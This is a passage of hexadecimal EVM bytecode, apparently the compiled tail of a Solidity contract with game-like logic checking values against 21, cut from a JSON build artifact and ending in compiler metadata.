34116127b257600080fd5b6040805133815234602082015281517fd2cad255828c6a11390781271ed9c840b1e7bb3828e52f54ade2e47e921c1a94929181900390910190a1565b30313410611d4c57604051600160a060020a038216903031340180156108fc02916000818181858888f1935050505015801561282e573d6000803e3d6000fd5b5050565b6002602081905260009182526040909120805491810154600382015460049092015490919084565b6040805160608181018352848252602080830182815283850183905260008781526003835294852084518155905180519394859490936128a1926002850192910190613514565b50604082015180516128bd916003840191602090910190613514565b5060009150505b84518110156129785761292a8686838151811015156128df57fe5b90602001906020020151600660008a81526020019081526020016000206000898681518110151561290c57fe5b906020019060200201518152602001908152602001600020546133af565b60008781526003602090815260408083208584526001908101835292819020845181558483015193810193909355830151805161296d9260028501920190613514565b5050506001016128c4565b506129838583612a32565b600086815260036020908152604090912082519294506129ab92600290910191850190613514565b507fa13218cc778a0424daabb1d4068e7bba37074b85adc46c38c4c5f2f5e108213584866040518080602001838152602001828103825284818151815260200191508051906020019060200280838360005b83811015612a155781810151838201526020016129fd565b50505050905001935050505060405180910390a150929392505050565b60008281526003602081905260408220606092910190612a5142612154565b9050612aac8183805480602002602001604051908101604052809291908181526020018280548015612aa257602002820191906000526020600020905b815481526020019060010190808311612a8e575b5050505050613485565b6000868152600360208181526040832090910180546001810182559083529120018190558451909150819085906000198101908110612ae757fe5b90602001906020020181815250507f2d7a146ae076211ecea08351a2b8a8c16c99296017a3a52d2a9549246910f95e85856040518083815260200180602001828103825283818151815260200191508051906020019060200280838360005b83811015612b5e578181015183820152602001612b46565b50505050905001935050505060405180910390a150919392505050565b6060806060806060612b8b6134dd565b600088815260026020908152604091829020825160c0810184528154815260018201805485518186028101860190965280865291949293858101939290830182828015612bf757602002820191906000526020600020905b815481526020019060010190808311612be3575b5050505050815260200160028201548152602001600382015481526020016004820154815260200160058201805480602002602001604051908101604052809291908181526020018280548015612c6d57602002820191906000526020600020905b815481526020019060010190808311612c59575b50505091909252505050600088815260036020908152604080832060028101805483518186028101860190945280845295965090948493612ce493929190830182828015612cda57602002820191906000526020600020905b815481526020019060010190808311612cc6575b5050505050611c82565b905060005b6020850151518111612ddb5760008181526001850160209081526040918290208054600290910180548451818502810185019095528085529193612d6193909290830182828015612cda5760200282019190600052602060002090815481526020019060010190808311612cc6575050505050611c82565b9350601584118015612d735750601583115b15612d8057875181908990fe5b6015841115612d9157865181908890fe5b6015831115612da257885181908a90fe5b82841415612db257875181908990fe5b83831115612dc257865181908890fe5b82841115612dd257885181908a90fe5b50600101612ce9565b507f92d3b91d75f3eacaf4423b4efceadaa3665ba7b1c7eb516fc052f4725750fc578b8b89898960405180868152602001858152602001806020018060200180602001848103845287818151815260200191508051906020019060200280838360005b83811015612e56578181015183820152602001612e3e565b50505050905001848103835286818151815260200191508051906020019060200280838360005b83811015612e95578181015183820152602001612e7d565b50505050905001848103825285818151815260200191508051906020019060200280838360005b83811015612ed4578181015183820152602001612ebc565b505050509050019850505050505050505060405180910390a1509499929850919650505050505050565b60006060601854816000815181101515612f1457fe5b60209081029091018101919091526018805460019081019091556040805160c0810182528a81528084018a81528183018a9052606082018990526080820188905260a0820186905260008c81526002865292909220815181559151805191949293612f859390850192910190613514565b5060408201516002820155606082015160038201556080820151600482015560a08201518051612fbf916005840191602090910190613514565b509050507fa5b9a16c3408d526ef131b0b1cf1f2c23e2a7c6aaed0d8920cfb72e05d8c265187878787876040518086815260200180602001858152602001848152602001838152602001828103825286818151815260200191508051906020019060200280838360005b83811015613041578181015183820152602001613029565b50505050905001965050505050505060405180910390a15060019695505050505050565b601b546000908190819060ff161561307c57600080fd5b6000858152600260209081526040918290206005018054835181840281018401909452808452606093928301828280156130d557602002820191906000526020600020905b8154815260200190600101908083116130c1575b5050505050905060008160018351038151811015156130f057fe5b6020908102909101810151336000818152808452604080822054848352600686528183208184528652918190208b905580518c8152948501849052848101829052606085018b905251929450909290917fa5de0ef7968dd143e0a4b49bb5aa432ecd76f42fcc11a724f0c7bc20e1702eab9181900360800190a15096979096509350505050565b33600081815260208181526040808320839055805160808101825287815280830185815291810187815260608083018890528580526001855282517fa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb4990815593517fa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb4a805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a039092169190911790559051805195968796929586959194939192613264927fa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb4b92919091019061358c565b506060820151805161328091600384019160209091019061358c565b509050507fca0229abd58d80d8892a94ca3cf62db29e674b60f093268589779a3b3913221f888289896040518085815260200184600160a060020a0316600160a060020a031681526020018060200180602001838103835285818151815260200191508051906020019080838360005b838110156133085781810151838201526020016132f0565b50505050905090810190601f1680156133355780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b83811015613368578181015183820152602001613350565b50505050905090810190601f1680156133955780820380516001836020036101000a031916815260200191505b50965050505050505060405180910390a196979350505050565b6133b76135f9565b60606133c38582612a32565b90506133cf8582612a32565b90506133d96135f9565b6060604051908101604052808681526020018581526020018381525090507f5f65d2486b09688b4d25c4dedbffff5b0e851a5c155cba789bfb19905f4373b78585846040518084815260200183815260200180602001828103825283818151815260200191508051906020019060200280838360005b8381101561346757818101518382015260200161344f565b5050505090500194505050505060405180910390a195945050505050565b6000805b825181116134d5575b82818151811015156134a057fe5b906020019060200201518414156134cd576134ba84612154565b93506134c68484613485565b9350613492565b600101613489565b509192915050565b60c0604051908101604052806000815260200160608152602001600081526020016000815260200160008152602001606081525090565b82805482825590600052602060002090810192821561354f579160200282015b8281111561354f578251825591602001919060010190613534565b5061355b92915061361b565b5090565b826002810192821561354f579160200282018281111561354f578251825591602001919060010190613534565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106135cd57805160ff191683800117855561354f565b8280016001018555821561354f579182018281111561354f578251825591602001919060010190613534565b6060604051908101604052806000815260200160008152602001606081525090565b61171091905b8082111561355b576000815560010161362156fea165627a7a72305820b81f1b67991d640ca3ac4614a78abc6087de1c02bebd0cecd0ea1c878c16e08d0029"
}